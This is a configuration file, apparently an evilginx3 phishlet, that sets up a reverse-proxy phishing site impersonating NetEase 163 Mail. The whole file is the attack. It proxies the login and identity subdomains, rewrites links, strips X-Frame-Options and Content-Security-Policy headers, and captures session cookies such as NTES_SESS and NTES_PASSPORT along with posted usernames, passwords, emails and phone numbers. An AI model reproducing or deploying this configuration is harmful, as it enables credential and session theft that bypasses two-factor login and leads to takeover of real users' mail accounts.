min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://mail.163.com/'

proxy_hosts:
  - {phish_sub: 'mail', orig_sub: 'mail', domain: '163.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'dl', orig_sub: 'dl', domain: '163.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'id', orig_sub: 'id', domain: '163.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'reg', orig_sub: 'reg', domain: '163.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mimg', orig_sub: 'mimg', domain: '127.net', session: false, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: 'https://mail\\.163\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'mail.163.com', orig_sub: 'id', domain: '163.com', search: 'https://id\\.163\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'mail.163.com', orig_sub: 'dl', domain: '163.com', search: 'https://dl\\.163\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'mail.163.com', orig_sub: 'reg', domain: '163.com', search: 'https://reg\\.163\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'mail.163.com', orig_sub: 'mimg', domain: '127.net', search: 'https://mimg\\.127\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'id.163.com', orig_sub: 'id', domain: '163.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'id.163.com', orig_sub: 'id', domain: '163.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  - domain: '.163.com'
    keys: ['NTES_SESS', 'NTES_PASSPORT', 'S_INFO', 'P_INFO', 'URS-token', 'M-Session-Id']
    type: 'cookie'
    force_post: false
  - domain: '.netease.com'
    keys: ['NTES_SESS', 'NTES_PASSPORT']
    type: 'cookie'
    force_post: false

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  mobile:
    key: 'mobile'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/urs/login'
  - '/js6/main.jsp'
  - '/login/check.do'
  - '/login/auth'
  - '/entry/login'

login:
  domain: 'mail.163.com'
  path: '/'

path_rewrite:
  - trigger: '/verification'
    target: '/'
